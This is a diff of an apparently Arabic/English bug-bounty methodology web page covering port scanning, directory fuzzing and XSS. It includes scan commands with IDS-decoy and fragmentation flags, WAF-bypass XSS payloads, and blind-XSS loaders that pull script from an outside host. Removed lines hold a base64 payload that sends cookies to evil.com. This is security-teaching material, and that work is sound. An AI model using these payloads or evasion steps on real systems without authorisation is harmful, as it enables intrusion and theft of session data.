@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=6">
-  <link rel="stylesheet" href="css/methodology.css?v=6">
+  <link rel="stylesheet" href="css/style.css?v=7">
+  <link rel="stylesheet" href="css/methodology.css?v=7">
 
   
 
@@ -1072,67 +1072,92 @@ Content-Type: application/json
 
       <!-- Phase 1: Port Scanning -->
       <div class="meth-content-view" id="meth-content-p1" style="display: none; --tool-color: #ff0055;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📡</span> Active Port Scanning</h2>
-          <p class="hero-tagline">فحص المنافذ والخدمات المفتوحة مع مقارنة الأدوات الفعالة</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">📡</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">Active Port Scanning</h2>
+            <p class="phase-module-tagline">فحص المنافذ والخدمات المفتوحة باحترافية وتحديد الإصدارات</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 15-40 min</span>
+              <span class="badge-difficulty bg-medium">Medium</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>⚡ Scanner Comparison (Naabu vs Nmap vs Rustscan)</h3></div>
+          <div class="card-header"><h3>⚡ Scanner Pipeline (Naabu -> Nmap)</h3></div>
+          <p>أفضل طريقة حالياً في الـ Bug Bounty هي دمج السرعة مع الدقة. لا تستخدم Nmap لفحص 65,000 منفذ لأنه بطيء جداً.</p>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
+                <th>الخطوة (Step)</th>
                 <th>الأداة (Tool)</th>
-                <th>نوع القوة (Strength)</th>
-                <th>سرعة الفحص (Speed)</th>
-                <th>أفضل استخدام لـ (Best Use-case)</th>
+                <th>السبب (Reason)</th>
               </tr>
             </thead>
             <tbody>
               <tr>
-                <td><strong class="text-primary">Naabu</strong></td>
-                <td>سرعة الفحص وتخطي جدر الحماية وتكامل البايبلاينز</td>
-                <td><span class="text-neon-green">Ultra High</span></td>
-                <td>مسح نطاقات عريضة لاكتشاف المنافذ المفتوحة سريعا</td>
+                <td>1. Fast Discovery</td>
+                <td><strong class="text-primary">Naabu / RustScan</strong></td>
+                <td>اكتشاف المنافذ المفتوحة فقط بسرعة صاروخية (خلال ثوانٍ).</td>
               </tr>
               <tr>
-                <td><strong class="text-primary">Rustscan</strong></td>
-                <td>تخطي حدود المعالجة الافتراضية عبر خيوط متزامنة</td>
-                <td><span class="text-neon-green">Very High</span></td>
-                <td>الفحص السريع للمنافذ قبل تمريرها لـ Nmap</td>
-              </tr>
-              <tr>
+                <td>2. Deep Probing</td>
                 <td><strong class="text-primary">Nmap</strong></td>
-                <td>سحب دقيق لإصدارات الخدمات واستخدام البرمجة (NSE)</td>
-                <td><span class="text-secondary">Medium</span></td>
-                <td>التحقق العميق وتحديد ثغرات الإصدارات المحددة</td>
+                <td>أخذ المنافذ التي وجدتها Naabu وتمريرها لـ Nmap لفحص الإصدارات (Version Detection).</td>
+              </tr>
+              <tr>
+                <td>3. UDP Scanning</td>
+                <td><strong class="text-primary">Nmap UDP</strong></td>
+                <td>فحص أهم منافذ UDP (مثل 161 SNMP, 53 DNS) للبحث عن تسريبات.</td>
               </tr>
             </tbody>
           </table></div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛠️ Port Scan Commands</h3></div>
+          <div class="card-header"><h3>🛠️ Port Scan Pro Commands</h3></div>
+          
+          <p class="text-neon-cyan"><strong>1. Naabu Fast Scan (All Ports)</strong></p>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">naabu -list alive.txt -p - -silent -o ports.txt
-nmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt</div>
+            <div class="cmd-ui-top">naabu -list subdomains.txt -p - -c 50 -rate 3000 -silent -o open_ports.txt</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('naabu -list alive.txt -p - -silent -o ports.txt\nnmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt', this)">📋 Copy</button>
+              <button class="cmd-btn" onclick="copyText('naabu -list subdomains.txt -p - -c 50 -rate 3000 -silent -o open_ports.txt', this)">📋 Copy</button>
+            </div>
+          </div>
+
+          <p class="text-neon-cyan" style="margin-top: 20px;"><strong>2. Nmap Targeted Scan (Pass ports to Nmap)</strong></p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">nmap -sC -sV -p $(cat open_ports.txt | cut -d ':' -f 2 | tr '\n' ',' | sed 's/,$//') -iL subdomains.txt -Pn -oN nmap_detailed.txt</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('nmap -sC -sV -p $(cat open_ports.txt | cut -d \':\' -f 2 | tr \'\\n\' \',\' | sed \'s/,$//\') -iL subdomains.txt -Pn -oN nmap_detailed.txt', this)">📋 Copy</button>
+            </div>
+          </div>
+
+          <p class="text-neon-cyan" style="margin-top: 20px;"><strong>3. Nmap UDP Scan (Top 100 ports)</strong></p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">sudo nmap -sU --top-ports 100 -iL subdomains.txt -Pn -oN nmap_udp.txt</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('sudo nmap -sU --top-ports 100 -iL subdomains.txt -Pn -oN nmap_udp.txt', this)">📋 Copy</button>
             </div>
           </div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Unauthenticated Kibana dashboard</h3></div>
-          <p><strong>الوصف (Scenario):</strong> فحص منافذ السيرفر كشف عن المنفذ 5601 الخاص بـ Kibana مفتوحاً للعامة دون توثيق.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> الدخول مباشرة للوحة التحكم وقراءة قواعد البيانات والـ Elasticsearch وسحب بيانات المستخدمين.</p>
-          <p><strong>الأثر (Impact):</strong> تسريب بيانات ملايين العملاء لشركة شحن معروفة.</p>
+
+        <div class="cyber-card border-purple">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🚨</span> WAF Evasion (تخطي الحماية)</h3></div>
+          <p>إذا كان الـ Target محمياً بـ Cloudflare أو Akamai، فإن فحص Nmap العادي سيؤدي إلى حظر الـ IP الخاص بك (Ban).</p>
+          <ul>
+            <li>استخدم <code>--mtu 24</code> لتقطيع الحزم (Fragmentation).</li>
+            <li>استخدم <code>-D RND:10</code> لاستخدام Decoys مخادعة.</li>
+            <li>استخدم <code>--randomize-hosts</code> و <code>--scan-delay 1s</code> لتقليل وتيرة الفحص.</li>
+          </ul>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p1" onclick="markPhaseComplete('p1','p_matrix')">
-          ✅ Mark Phase Complete — Port Scanning Done → Proceed to Decision Matrix
+          ✅ Mark Phase Complete — Port Scanning Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase Recon Decision Matrix -->
       <div class="meth-content-view" id="meth-content-p_matrix" style="display: none; --tool-color: #00e5ff;">
@@ -1207,129 +1232,118 @@ nmap -sC -sV -p80,443,8080,8443,22 -Pn -v -iL alive.txt -oN nmap_details.txt</di
 
       <!-- Phase 6: Directory Discovery -->
       <div class="meth-content-view" id="meth-content-p6" style="display: none; --tool-color: #00ff66;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">📂</span> Directory & Files Fuzzing</h2>
-          <p class="hero-tagline">منهجية التخمين الفائقة للمجلدات والملفات والمسارات المخفية</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">📂</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">Directory & Files Fuzzing</h2>
+            <p class="phase-module-tagline">منهجية التخمين الفائقة للمجلدات والملفات والمراوغات الأمنية</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 30-60 min</span>
+              <span class="badge-difficulty bg-high">Hard (WAF Evasion)</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ Fuzzing Comparison (ffuf vs feroxbuster vs dirsearch vs wfuzz)</h3></div>
+          <div class="card-header"><h3>🛡️ Fuzzing Arsenal</h3></div>
+          <p>عملية الـ Fuzzing ليست مجرد تشغيل أداة، بل هي فن اختيار القاموس (Wordlist) المناسب وتخطي الجدار الناري.</p>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
                 <th>Tool</th>
                 <th>Speed</th>
-                <th>Recursive Capability</th>
-                <th>API Fuzzing</th>
                 <th>Best For</th>
               </tr>
             </thead>
             <tbody>
               <tr>
                 <td><strong class="text-primary">FFUF</strong></td>
-                <td><span class="text-neon-green">Very High</span></td>
-                <td>Medium</td>
-                <td>Excellent</td>
-                <td>APIs & Custom header fuzzing</td>
+                <td><span class="text-neon-green">Ultra Fast</span></td>
+                <td>تخمين الـ APIs، Headers، واكتشاف الـ Virtual Hosts. الأقوى حالياً.</td>
               </tr>
               <tr>
                 <td><strong class="text-primary">Feroxbuster</strong></td>
-                <td><span class="text-neon-green">High</span></td>
-                <td>Excellent (Auto-recursion)</td>
-                <td>Good</td>
-                <td>Deep Directory structure mapping</td>
+                <td><span class="text-neon-green">Very Fast</span></td>
+                <td>التخمين العميق (Recursive)، يقوم بالدخول لكل مجلد يجده ليكمل التخمين داخله.</td>
               </tr>
               <tr>
                 <td><strong class="text-primary">Dirsearch</strong></td>
                 <td>Medium</td>
-                <td>Good</td>
-                <td>Medium</td>
-                <td>Beginners & Simple quick scans</td>
-              </tr>
-              <tr>
-                <td><strong class="text-primary">Wfuzz</strong></td>
-                <td>Medium</td>
-                <td>Advanced</td>
-                <td>Excellent</td>
-                <td>Custom Payloads & multi-parameter injection</td>
+                <td>سهل جداً للمبتدئين ويحتوي على قواميس مدمجة ممتازة.</td>
               </tr>
             </tbody>
           </table></div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📂 Sensitive Files Matrix (مصفوفة الملفات الأكثر أهمية)</h3></div>
+          <div class="card-header"><h3>🔥 Pro FFuF Commands</h3></div>
+          
+          <p class="text-neon-cyan"><strong>1. Basic Directory Fuzzing (مع فلترة الأخطاء)</strong></p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -c -mc 200,301,302,403</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -c -mc 200,301,302,403', this)">📋 Copy</button>
+            </div>
+          </div>
+
+          <p class="text-neon-cyan" style="margin-top: 20px;"><strong>2. File Fuzzing (البحث عن ملفات حساسة)</strong></p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.env,.zip,.sql,.git -t 40</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('ffuf -u https://target.com/FUZZ -w /path/to/SecLists/Discovery/Web-Content/raft-medium-files.txt -e .php,.txt,.env,.zip,.sql,.git -t 40', this)">📋 Copy</button>
+            </div>
+          </div>
+
+          <p class="text-neon-cyan" style="margin-top: 20px;"><strong>3. WAF Evasion (تخطي حجب Cloudflare/Akamai)</strong></p>
+          <p style="font-size: 0.95rem; color: #94a3b8;">للتخطي استخدم تأخير الطلبات، إضافة ترويسات عشوائية، أو استخدام Proxy.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">ffuf -u https://target.com/FUZZ -w wordlist.txt -t 10 -p 1 -H "X-Forwarded-For: 127.0.0.1" -H "User-Agent: Mozilla/5.0" -ac</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('ffuf -u https://target.com/FUZZ -w wordlist.txt -t 10 -p 1 -H \"X-Forwarded-For: 127.0.0.1\" -H \"User-Agent: Mozilla/5.0\" -ac', this)">📋 Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3>📂 Sensitive Files Matrix (ملفات دسمة للـ Bug Bounty)</h3></div>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
                 <th>الملف (File)</th>
-                <th>الخطورة (Severity)</th>
-                <th>السبب والوظيفة (Purpose)</th>
-                <th>الإجراء المباشر (Next Action)</th>
+                <th>الخطورة</th>
+                <th>الإجراء المباشر بعد الاكتشاف</th>
               </tr>
             </thead>
             <tbody>
               <tr>
                 <td><code>.git/</code></td>
                 <td><span class="text-neon-red">Critical</span></td>
-                <td>تسريب الشيفرة البرمجية الكاملة للموقع مع تاريخ التعديلات والمبرمجين</td>
-                <td>استخدام <code>git-dumper</code> لسحب مجلد git بالكامل والتحليل المحلي.</td>
+                <td>استخدم أداة <code>git-dumper</code> لسحب المجلد بالكامل وقراءة الأكواد السرية.</td>
               </tr>
               <tr>
                 <td><code>.env</code></td>
                 <td><span class="text-neon-red">Critical</span></td>
-                <td>يضم كلمات مرور قواعد البيانات، مفاتيح الـ APIs الحساسة ورموز الربط</td>
-                <td>سحب الأسرار واستخدامها للولوج لقواعد البيانات أو السحابة مباشرة.</td>
-              </tr>
-              <tr>
-                <td><code>backup.zip / backup.sql</code></td>
-                <td><span class="text-neon-red">Critical</span></td>
-                <td>نسخة احتياطية كاملة للملفات أو قاعدة البيانات الموثقة</td>
-                <td>فك الضغط ومراجعة الشيفرة البرمجية واستيراد قواعد البيانات.</td>
+                <td>تضم كلمات مرور قواعد البيانات والـ API Keys (مثل AWS Keys).</td>
               </tr>
               <tr>
                 <td><code>swagger.json</code></td>
                 <td><span class="text-neon-cyan">High</span></td>
-                <td>خريطة تفصيلية لجميع مسارات الـ APIs ومعاملاتها المتاحة</td>
-                <td>استيراد الملف ببرنامج Postman والبدء بفحص الـ API مباشرة.</td>
+                <td>استورد الملف في Postman وابدأ باختبار نقاط الـ API المخفية.</td>
               </tr>
               <tr>
-                <td><code>phpinfo.php</code></td>
-                <td><span class="text-secondary">Medium</span></td>
-                <td>تسريب معلومات تكوين خادم الويب والمسارات ومحركات الحماية</td>
-                <td>فحص الإصدارات للبحث عن ثغرات CVEs معروفة.</td>
+                <td><code>backup.zip</code></td>
+                <td><span class="text-neon-red">Critical</span></td>
+                <td>قم بتحميلها فورا، قد تحتوي على شفرة المصدر أو الـ Database.</td>
               </tr>
             </tbody>
           </table></div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>⚙️ Extensions Discovery List</h3></div>
-          <p>أهم الامتدادات المطلوب فحصها وتخمينها:</p>
-          <ul class="t-check-list">
-            <li>✔ <code>.php</code> — ملفات السكربت النشطة.</li>
-            <li>✔ <code>.bak / .old</code> — النسخ الاحتياطية لملفات التكوين.</li>
-            <li>✔ <code>.zip / .tar.gz</code> — الأرشيف المضغوط للمجلدات.</li>
-            <li>✔ <code>.env / .log / .sql</code> — سجلات التكوين والبيانات الحساسة.</li>
-          </ul>
-        </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Exposed .git directory</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تخمين المسارات المخفية كشف عن مجلد .git مفتوحاً بالكامل للتحميل على موقع حكومي حساس.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> قام المهاجم بتحميل كامل الشيفرة المصدرية للموقع ومراجعتها محلياً واستخراج كلمات مرور قواعد البيانات.</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top">wget --mirror --no-parent http://target.com/.git/
-# Reconstructing repository
-git status</div>
-          </div>
-          <p><strong>الأثر (Impact):</strong> السيطرة الكاملة على السيرفر والبيانات.</p>
-        </div>
-      
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p6" onclick="markPhaseComplete('p6','p4')">
-          ✅ Mark Phase Complete — Directory Discovery Done → Proceed to JavaScript Recon
+          ✅ Mark Phase Complete — Directory Discovery Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase 4: JavaScript Recon -->
       <div class="meth-content-view" id="meth-content-p4" style="display: none; --tool-color: #00e5ff;">
@@ -1713,64 +1727,92 @@ aws s3 ls</div>
 
       <!-- Phase 7: XSS Workflow -->
       <div class="meth-content-view" id="meth-content-p7" style="display: none; --tool-color: #bf80ff;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🌐</span> Cross-Site Scripting (XSS)</h2>
-          <p class="hero-tagline">منهجية الفحص والتعرف على سياقات الحقن وكتابة الحمولات المناسبة لتخطي الفلاتر</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">🌐</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">Cross-Site Scripting (XSS)</h2>
+            <p class="phase-module-tagline">منهجية الفحص، تجاوز فلاتر الحماية (WAF)، واختراق سياق الـ DOM</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 1-3 Hours</span>
+              <span class="badge-difficulty bg-high">Hard</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 XSS Overview & Detection</h3></div>
-          <p>تحدث ثغرة XSS عند انعكاس مدخلات المستخدم مباشرة داخل الـ DOM أو ملفات HTML من غير تعقيم.</p>
+          <div class="card-header"><h3>💡 XSS Hunting Strategy</h3></div>
+          <p>لا تقم برمي الـ Payloads بشكل عشوائي! اتبع هذه المنهجية لاكتشاف ثغرات الـ XSS المخفية بدقة:</p>
           <ul class="t-check-list">
-            <li>✔ <strong>Detection:</strong> حقن مدخلات مثل <code>Reflected&lt;Img&gt;</code> لمراقبة الانعكاس وسياق الصفحة.</li>
-            <li>✔ <strong>Tools:</strong> XSStrike, Dalfox.</li>
+            <li>✔ <strong>1. Test Reflection:</strong> اكتب كلمة مميزة (مثل <code>hxss99</code>) ولاحظ أين تنعكس في الكود المصدر.</li>
+            <li>✔ <strong>2. Break Context:</strong> حاول كسر السياق (إذا كنت في Attribute، جرب <code>"&gt;</code>).</li>
+            <li>✔ <strong>3. Bypass WAF:</strong> استخدم تشفير URL أو تعليقات HTML أو Event Handlers غير مألوفة.</li>
           </ul>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📋 Context Matrix</h3></div>
+          <div class="card-header"><h3>📋 Context Injection Matrix (كيف تكسر السياق؟)</h3></div>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
-                <th>سياق الحقن (Context)</th>
-                <th>المثال (HTML Context)</th>
-                <th>الحمولة المفضلة (Payload Example)</th>
+                <th>سياق الانعكاس (Reflection Context)</th>
+                <th>أفضل Payload للتخطي</th>
+                <th>ملاحظات</th>
               </tr>
             </thead>
             <tbody>
               <tr>
-                <td><strong>HTML Context</strong></td>
-                <td><code>&lt;div&gt;REFLECTED_HERE&lt;/div&gt;</code></td>
-                <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                <td><strong>Inside HTML Tags</strong><br><code>&lt;div&gt;hxss99&lt;/div&gt;</code></td>
+                <td><code>&lt;svg/onload=alert(1)&gt;</code></td>
+                <td>الأبسط، ولكن الـ WAF عادة يمسكه بسرعة.</td>
               </tr>
               <tr>
-                <td><strong>Attribute Context</strong></td>
-                <td><code>&lt;input value="REFLECTED_HERE"&gt;</code></td>
-                <td><code>" onmouseover="alert(1)</code></td>
+                <td><strong>Inside Attributes</strong><br><code>&lt;input value="hxss99"&gt;</code></td>
+                <td><code>" autofocus onfocus=alert(1) x="</code></td>
+                <td>نعتمد على الأحداث (Events) دون الحاجة لفتح وسم جديد.</td>
               </tr>
               <tr>
-                <td><strong>Javascript Context</strong></td>
-                <td><code>&lt;script&gt;var name = 'REFLECTED_HERE';&lt;/script&gt;</code></td>
-                <td><code>'; alert(1); //</code></td>
+                <td><strong>Inside Script Blocks</strong><br><code>var x = 'hxss99';</code></td>
+                <td><code>'-alert(1)-'</code> <br>أو<br> <code>';alert(1)//</code></td>
+                <td>الهدف إغلاق الـ String وتنفيذ الكود ثم تعليق باقي السطر.</td>
               </tr>
             </tbody>
           </table></div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Cloudflare WAF bypass on financial forum</h3></div>
-          <p><strong>الوصف (Scenario):</strong> تخطي جدار الحماية لتمرير حمولة XSS ناجحة لسرقة الكوكيز الخاصة بمدير المنتدى.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> استخدام وسم SVG مع تفاعل مباشر لا يتطلب وسم script لحقن كود السرقة.</p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🔥 Top WAF Evasion Payloads (تخطي الفلاتر الصعبة)</h3></div>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">&lt;svg onload=eval(atob('ZmV0Y2goJ2h0dHA6Ly9ldmlsLmNvbS8nK2RvY3VtZW50LmNvb2tpZSk='))&gt;</div>
+            <div class="cmd-ui-top"><span class="text-secondary"># Cloudflare Bypass</span>
+&lt;svg/onload=eval(atob('YWxlcnQoMSk='))&gt;
+
+<span class="text-secondary"># Akamai Bypass (No Quotes)</span>
+&lt;script&gt;setTimeout(alert, 0)&lt;/script&gt;
+
+<span class="text-secondary"># Imperva / Incapsula</span>
+%3Cimg%20src%3Dx%20onerror%3D%22prompt(1)%22%3E</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('<svg/onload=eval(atob(\'YWxlcnQoMSk=\'))>\n<script>setTimeout(alert, 0)</script>\n%3Cimg%20src%3Dx%20onerror%3D%22prompt(1)%22%3E', this)">📋 Copy Payloads</button>
+            </div>
           </div>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$2,000</span></p>
         </div>
-      
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">🥷</span> Blind XSS (الضربات الصامتة)</h3></div>
+          <p>إذا كانت الإدخالات تُحفظ ولا تظهر لك (مثل رسائل الدعم الفني، اسم المستخدم)، استخدم <strong>XSS Hunter</strong> أو <strong>BXSS Helper</strong>.</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top">"&gt;&lt;script src="https://yourxss.xss.ht"&gt;&lt;/script&gt;
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yourxss.xss.ht\';document.body.appendChild(a)')</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('\"><script src=\"https://yourxss.xss.ht\"></script>', this)">📋 Copy BXSS</button>
+            </div>
+          </div>
+        </div>
+
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p7" onclick="markPhaseComplete('p7','p8')">
-          ✅ Mark Phase Complete — XSS Workflow Done → Proceed to SQLi Workflow
+          ✅ Mark Phase Complete — XSS Workflow Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase 8: SQLi Workflow -->
       <div class="meth-content-view" id="meth-content-p8" style="display: none; --tool-color: #ef4444;">
